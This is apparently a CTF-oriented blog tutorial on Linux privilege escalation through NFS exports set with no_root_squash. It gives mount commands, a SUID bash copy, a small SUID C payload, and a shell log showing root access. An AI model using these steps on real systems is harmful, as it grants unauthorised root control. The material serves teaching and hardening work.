---
title: Linux Privilege Escalation - NFS Root Squashing for CTF Creators
draft: false
author: "pwnlopg"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [privilege escalation, nfs, root_squashing, defend]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Shares can lead to root!"
---

#  NFS

Root squash is an NFS feature that maps the remote root user (UID 0) to a local user with minimal privileges, typically the nobody user (UID 65534). This prevents remote root users from having root privileges on the NFS server, enhancing security.

The NFS configuration file is `/etc/exports`. Here are the relevant options:

- no_root_squash: This option disables root squash, allowing the root user on the client to access files on the NFS server as root. This can be risky, as it allows the creation of malicious files on the NFS share with root privileges.

- no_all_squash: This option is similar to no_root_squash but applies to non-root users, preventing their UIDs from being mapped to the nobody user.

# Privilege Escalation via NFS Root Squashing

On the victim machine we'll find the directory in which NFS is hosting files:

```bash
cat /etc/exports
```

On your adversary host, we'll install the NFS client package:

```bash
 sudo apt install nfs-common
```

In our adversary host, we'll create a directory to host the NFS share:

```bash
mkdir /tmp/nfs
```

In our adversary host, we will mount the remote share in the `/tmp/nfs` directory of our adversary host, make sure to run this command with sudo.

```bash
sudo mount -o rw,vers=2 10.10.10.14:/tmp /tmp/nfs
```

The following error means that we don't have permission to mount the share, try it with sudo instead.

> mount.nfs: failed to apply fstab options

The following error means that we need to try another protocol version.

> mount.nfs: Protocol not supported

Alternatively, we can mount it this way:

```bash
sudo mount -t nfs 10.10.10.14:/tmp /tmp/nfs
```

If we receive the error down by the user:

> mount: /tmp/nfs: bad option; for several file systems (e.g. nfs) we might need a /sbin/mount.
	
This means that we don't have an NFS client installed:

```bash
sudo apt install nfs-common
```

Once the share is mounted we can attempt to create a payload.

We can create a bash binary with a SUID bit:

```bash
sudo cp /bin/bash /tmp/nfs/bash && sudo chmod u+s /tmp/nfs/bash
```

Another payload that we can use is a custom C code:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	setresuid(0, 0, 0);
	setuid(getuid());
	system("/usr/bin/bash");
	return 0;
}
```

Compile this payload and remove any existing if any, then copy the payload to the share:

```bash
gcc payload.c -o payload && sudo rm /tmp/nfs/payload 2>/dev/null; sudo cp payload /tmp/nfs
```

Add the SUID bit to the payload executable:

```bash
sudo chmod u+s /tmp/nfs/payload
```

Now in the victim host, we can execute any of the previous payloads to escalate privileges:

```bash
user@pwn:/tmp$ ls -l
total 1296
-rwsr-xr-x 1 root root 1230280 Dec 1 09:03 bash
-rwsr-xr-x 1 root root   16232 Dec 1 09:05 payload

user@pwn:/tmp$ ./bash -p
bash-5.1# whoami
root
bash-5.1# exit

user@pwn:/tmp$ ./payload 
root@pwn:/tmp# id
uid=0(root) gid=1000 (user) <...SNIP...>
```

Once we're done we can unmount the shared directory in our adversary host:

```bash
sudo umount /tmp/nfs
```